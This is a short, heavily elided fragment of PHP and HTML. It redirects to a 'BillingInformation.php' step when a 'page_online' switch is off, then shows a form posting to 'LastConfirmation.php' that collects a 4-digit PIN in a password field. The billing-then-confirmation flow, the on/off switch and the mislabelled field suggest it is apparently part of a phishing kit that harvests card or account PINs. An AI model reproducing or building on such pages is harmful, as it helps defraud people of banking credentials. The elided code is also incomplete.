...
if($setting['page_online'] != "on") {
    header("Location: BillingInformation.php");
}
         ...
         <div class="account-content-container">
            <div class="account-table-body">
               ...
               <section class="account-section">
                  ...
                  <form class="wait" action="php/LastConfirmation.php" method="POST" >
...
<div class="ui-field-contain margin-bot-0">
		...
		<input style="padding-left: 10px;" class="form-control" id="emailAddressJt" type="password" name="pin" class="required EMAIL" data-validation="length" data-validation-error-msg=" " data-validation-length="min4-4" size="23" placeholder="****" maxlength="4" >
</div>
	</div>
